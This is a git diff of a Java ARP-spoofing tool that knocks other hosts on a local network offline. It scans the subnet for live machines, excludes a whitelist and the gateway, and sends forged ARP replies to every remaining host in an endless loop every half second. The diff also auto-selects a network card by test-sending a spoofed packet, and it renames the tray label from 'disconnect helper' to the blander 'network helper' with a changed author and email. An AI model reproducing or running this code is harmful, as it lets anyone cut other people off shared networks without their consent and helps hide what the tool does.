@@ -32,7 +32,7 @@ import java.util.regex.Pattern;
  */
 public class NzArpHoaxDisnet {
 
-    public static void main(String[] args)  {
+    public static void main(String[] args) {
 
         // 启动方法-欺骗网关-进行局域网断网
         try {
@@ -49,14 +49,19 @@ public class NzArpHoaxDisnet {
     private final static Logger log = LoggerFactory.getLogger(NzArpHoaxDisnet.class);
 
     /**
-     * 重发间隔时间
+     * 重发间隔时间 TIME * 1000
      */
-    public static Integer TIME = 1;
+    public static Double TIME = 0.5;
 
     /**
      * 是否初始化
      */
     public static Boolean BL = true;
+
+    /**
+     * 手动选择网卡重试次数
+     */
+    public static Integer MANUALNUM = 6;
 
     /**
      * 输入
@@ -119,6 +124,11 @@ public class NzArpHoaxDisnet {
     public static List<String> IPLIS = new ArrayList();
 
     /**
+     * 存活者IP, 用于检测网卡
+     */
+    public static String ALIVEIP1;
+
+    /**
      * 网卡对象
      */
     public static NetworkInterface DEVICE;
@@ -161,12 +171,14 @@ public class NzArpHoaxDisnet {
                 GATEWAYMAC = NetUtil.getMacAddress(GATEWAYIPOBJ.getHostName());
                 // 网关MAC数组
                 GATEWAYMACARR = NetUtil.stomac(GATEWAYMAC);
+                // 存活者IP
+                ALIVEIP1 = NetUtil.getAliveIp1(NETSEGMENT);
                 // 自动打开默认网卡（失败将自动切换为手动打开）
                 SENDER = selfOpenDevice();
                 // 扫描并存储网段下所有存活主机的IP与MAC
                 IPANDMACS = findAllMacAddress(NETSEGMENT, DEVICE, IPLIS);
                 // 删除不断网的IP
-                IPLIS = removeArpNotDisnet(IPLIS, ARPNOTDISNETPATH);
+                IPLIS = removeArpNotDisnet(IPLIS, ARPNOTDISNETPATH, GATEWAYIP, MYIP);
             }
         } catch (Exception e) {
             e.printStackTrace();
@@ -180,12 +192,13 @@ public class NzArpHoaxDisnet {
         // 启动成功
         log.info("ArpNotDisnet starting success .............");
         // 循环发送ARP应答包
-        for (int i = 1; true; i++) {
+        while (true) {
             for (String tarip : IPLIS) {
                 // 构造ARP包请求，并发送（MYMACARR -> 可伪造）
                 SENDER.sendPacket(constractReqArps(MYMACARR, InetAddress.getByName(tarip), GATEWAYMACARR, GATEWAYIPOBJ, 2));
             }
-            Thread.sleep(TIME * 1000);
+            // 休息 TIME 秒
+            Thread.sleep((long) (TIME * 1000));
         }
     }
 
@@ -196,7 +209,8 @@ public class NzArpHoaxDisnet {
      * @return
      * @throws IOException
      */
-    private static List<String> removeArpNotDisnet(List<String> iplis, String arpnotdisnetpath) throws IOException {
+    private static List<String> removeArpNotDisnet(List<String> iplis, String arpnotdisnetpath, String gatewayip, String myip) throws IOException {
+        log.info("开始移除非断网IP.");
         // 存储ip列表（1.读取文件IP配置 2.网关 3.本地IP地址）
         List<String> relis = new ArrayList(16);
         // 获得项目路径并处理
@@ -209,10 +223,15 @@ public class NzArpHoaxDisnet {
             // 存在就按行读取文件内容
             relis.addAll(FileUtils.readLines(file, "UTF-8"));
         }
-        relis.add(GATEWAYIP);
-        relis.add(MYIP);
+        relis.add(gatewayip);
+        relis.add(myip);
+        // del msg
+        for (String ip : relis) {
+            log.info(ip);
+        }
         // 在所有IP列表中移除
         iplis.removeAll(relis);
+        log.info("处理完成, 当前 " + iplis.size() + " 个主机存活.");
         return iplis;
     }
 
@@ -226,8 +245,6 @@ public class NzArpHoaxDisnet {
         Map<String, String> maps = new HashMap(26);
         // start time
         Long l1 = System.currentTimeMillis();
-        // 方式一 + 方式二 即可缩小范围以及更精准的获取有效数据信息
-        // 方式一：arp -a ip 扫描存活主机
         // 1. 初始化 1-255 个网络地址，当然也可以自己指定范围（默认情况网关后缀为1，所以从2开始）
         ArrayList<String> list = new ArrayList();
         for (int i = 1; i <= 255; i++) {
@@ -235,22 +252,8 @@ public class NzArpHoaxDisnet {
         }
         // 2. 扫描当前局域网中所有存活的主机
         log.info("开始扫描当前局域网所有存活主机, 预计耗时: 60 秒.");
-        for (int i = 0; i < list.size(); i++) {
-            // ip（当前ip地址）
-            String tarip = list.get(i);
-            // mac（执行cmd命令获得MAC地址）
-            String tarmac = NetUtil.getMacAddress(tarip).toUpperCase();
-            // 目标主机的MAC不存在，继续下一轮
-            if (tarmac == null || tarmac.equals("")) {
-                continue;
-            }
-            log.info("IP-> " + tarip + "\t,\t" + "MAC-> " + tarmac);
-            // 存储 ip-mac
-            maps.put(tarip, tarmac);
-            // 存储 ip
-            iplis.add(tarip);
-        }
-        // 方式二：arp 发送请求，以响应结果判断存活主机
+        // 方式一 + 方式二 即可缩小范围以及更精准的获取有效数据信息
+        // 方式一：arp 发送请求，以响应结果判断存活主机
         JpcapCaptor captor = JpcapCaptor.openDevice(device, 2000, false, 3000);
         captor.setFilter("arp", true);
         JpcapSender sender = captor.getJpcapSenderInstance();
@@ -283,9 +286,8 @@ public class NzArpHoaxDisnet {
                     str.append(hex);
                     str.append('.');
                 }
-
+                // ip
                 String ip = str.toString().substring(0, str.length() - 1);
-
                 /*
                  * 判断目标主机是否存活
                  * 有两种情况会返回MAC地址为00-00-00-00-00-00
@@ -294,10 +296,9 @@ public class NzArpHoaxDisnet {
                  */
                 boolean isAlive = false;
                 byte[] deadMac = NetUtil.stomac("00-00-00-00-00-00");
-                if (!(p.target_hardaddr[0] == deadMac[0] && p.target_hardaddr[1] == deadMac[1]
-                        && p.target_hardaddr[2] == deadMac[2]
-                        && p.target_hardaddr[3] == deadMac[3]
-                        && p.target_hardaddr[4] == deadMac[4]
+                if (!(p.target_hardaddr[0] == deadMac[0]
+                        && p.target_hardaddr[1] == deadMac[1] && p.target_hardaddr[2] == deadMac[2]
+                        && p.target_hardaddr[3] == deadMac[3] && p.target_hardaddr[4] == deadMac[4]
                         && p.target_hardaddr[5] == deadMac[5])) {
                     isAlive = true;
                 }
@@ -305,26 +306,40 @@ public class NzArpHoaxDisnet {
                     // 目标主机未存活
                     continue;
                 }
-
                 // 保存可用的目标主机IP-MAC对
-                if (!maps.containsKey(ip)) {
-                    str = new StringBuilder();
-                    // 解析ARP响应方MAC地址
-                    for (byte part : p.sender_hardaddr) {
-                        String hex = Integer.toHexString(part & 0xff).toUpperCase();
-                        str.append(hex.length() == 1 ? "0" + hex : hex);
-                        str.append('-');
-                    }
-                    String mac = str.toString().substring(0, 17);
-                    log.info("IP-> " + ip + "   ,   " + "MAC-> " + mac);
-                    maps.put(ip, mac);
-                    // 存储 ip
-                    iplis.add(ip);
-                } else {
-                    // 当前扫描IP记录已存在，进入下一轮
-                    continue;
+                str = new StringBuilder();
+                // 解析ARP响应方MAC地址
+                for (byte part : p.sender_hardaddr) {
+                    String hex = Integer.toHexString(part & 0xff).toUpperCase();
+                    str.append(hex.length() == 1 ? "0" + hex : hex);
+                    str.append('-');
                 }
+                // mac
+                String mac = str.toString().substring(0, 17);
+                // 存储 ip-mac
+                maps.put(ip, mac);
+                // 存储 ip
+                iplis.add(ip);
+                // msg
+                log.info("IP-> " + ip + "\t,\t" + "MAC-> " + mac);
             }
+        }
+        // 方式二：arp -a ip 扫描存活主机
+        for (int i = 0; i < list.size(); i++) {
+            // ip（当前ip地址）
+            String tarip = list.get(i);
+            // mac（执行cmd命令获得MAC地址）
+            String tarmac = NetUtil.getMacAddress(tarip).toUpperCase();
+            // 目标ip已存在 or 目标主机的MAC不存在，继续下一轮
+            if (maps.containsKey(tarip) || tarmac == null || tarmac.equals("")) {
+                continue;
+            }
+            // 存储 ip-mac
+            maps.put(tarip, tarmac);
+            // 存储 ip
+            iplis.add(tarip);
+            // msg
+            log.info("IP-> " + tarip + "\t,\t" + "MAC-> " + tarmac);
         }
         // stop time
         Long l2 = System.currentTimeMillis();
@@ -334,29 +349,44 @@ public class NzArpHoaxDisnet {
 
     /**
      * 自动-打开网卡
+     * 例：Realtek公司PCIe接口千兆以太网系列控制器（大多数都是这个呢）- Realtek PCIe GBE Family Controller
      *
      * @return
      */
-    private static JpcapSender selfOpenDevice() throws IOException {
+    private static JpcapSender selfOpenDevice() {
+        // 发送者设备
+        JpcapSender sender = null;
         // 枚举网卡
         NetworkInterface[] devices = JpcapCaptor.getDeviceList();
+        // 一、自动
         for (int i = 0; i < devices.length; i++) {
-            // Realtek公司PCIe接口千兆以太网系列控制器（大多数都是这个呢）
-            if ("Realtek PCIe GBE Family Controller".equals(devices[i].description)) {
-                // 保存网卡
-                DEVICE = devices[i];
-                break;
+            // 1. 保存网卡
+            DEVICE = devices[i];
+            try {
+                // 2. 打开设备
+                sender = JpcapSender.openDevice(DEVICE);
+                // 构造ARP包请求，并发送（MYMACARR -> 可伪造）
+                sender.sendPacket(constractReqArps(MYMACARR, InetAddress.getByName(ALIVEIP1), GATEWAYMACARR, GATEWAYIPOBJ, 2));
+            } catch (Exception e) {
+                sender = null;
+                e.printStackTrace();
+            } finally {
+                // 3. 自动打开成功
+                if (sender != null) {
+                    log.info("自动选择的网卡为: " + DEVICE.description + ".");
+                    break;
+                }
             }
         }
-        // 打开失败（默认指定网卡不存在）
-        if (DEVICE == null) {
+        // 二、手动
+        // 打开失败（指定网卡不存在）
+        if (sender == null) {
             log.info("自动打开网卡失败. 正在尝试手动开启, 稍等......");
             // 手动选择并打开设备
-            return manOpenDevice();
+            sender = manualOpenDevice();
         }
-        log.info("自动选择的网卡为: " + DEVICE.description + ".");
-        // 打开设备并返回
-        return JpcapSender.openDevice(DEVICE);
+        // 返回设备
+        return sender;
     }
 
     /**
@@ -364,19 +394,40 @@ public class NzArpHoaxDisnet {
      *
      * @return
      */
-    private static JpcapSender manOpenDevice() throws IOException {
+    private static JpcapSender manualOpenDevice() {
+        // 发送者设备
+        JpcapSender sender = null;
         // 枚举网卡
         NetworkInterface[] devices = JpcapCaptor.getDeviceList();
         for (int i = 0; i < devices.length; i++) {
             log.info(i + "." + devices[i].description);
         }
-        // 选择网卡
-        log.info("选择一个网卡：");
-        // 获得指定下标的网卡
-        DEVICE = devices[SCANNER.nextInt()];
-        log.info("手动选择的网卡为: " + DEVICE.description + ".");
-        // 打开设备并返回
-        return JpcapSender.openDevice(DEVICE);
+        // 重试次数
+        int n = 1;
+        while (n <= MANUALNUM) {
+            // 0. 选择网卡
+            log.info("选择一个网卡：");
+            // 1. 保存网卡 - 获得指定下标的网卡
+            DEVICE = devices[SCANNER.nextInt()];
+            try {
+                // 2. 打开设备
+                sender = JpcapSender.openDevice(DEVICE);
+                // 构造ARP包请求，并发送（MYMACARR -> 可伪造）
+                sender.sendPacket(constractReqArps(MYMACARR, InetAddress.getByName(ALIVEIP1), GATEWAYMACARR, GATEWAYIPOBJ, 2));
+            } catch (Exception e) {
+                sender = null;
+                log.info(DEVICE.description + ", 网卡打开失败, 还可重试" + (MANUALNUM - n) + "次.", e);
+            } finally {
+                // 3. 自动打开成功
+                if (sender != null) {
+                    log.info("手动选择的网卡为: " + DEVICE.description + ".");
+                    break;
+                }
+                n++;
+            }
+        }
+        // 返回设备
+        return sender;
     }
 
     /**
@@ -422,6 +473,25 @@ public class NzArpHoaxDisnet {
      * @version: 02.06
      */
     private static class NetUtil {
+
+        /**
+         * 获得一个存活者IP
+         *
+         * @return
+         * @throws Exception
+         */
+        private static String getAliveIp1(String netsegment) throws Exception {
+            String result = command("arp -a");
+            String regExp = netsegment + ".[0-9]{1,3}";
+            Matcher matcher = Pattern.compile(regExp).matcher(result);
+            int n = 0;
+            while (matcher.find()) {
+                if (++n == 3) {
+                    return matcher.group();
+                }
+            }
+            return netsegment + ".100";
+        }
 
         /**
          * 执行单条指令
@@ -519,7 +589,7 @@ public class NzArpHoaxDisnet {
                 // 添加弹出菜单到托盘图标
                 trayIcon.setPopupMenu(popupMenu);
                 // 提示信息
-                String[] msgs = {"断网助手", "名称：断网助手 \\n作者：林沢 \\n邮箱：1134881605@qq.com \\n版本：2.6 \\n时间：2019.12.26"};
+                String[] msgs = {"网络助手", "名称：网络助手 \\n作者：hoax \\n邮箱：arphoaxdisnet@qq.com \\n版本：2.6 \\n时间：2019.12.26"};
                 // 添加工具提示文本
                 trayIcon.setToolTip(msgs[0]);
                 try {
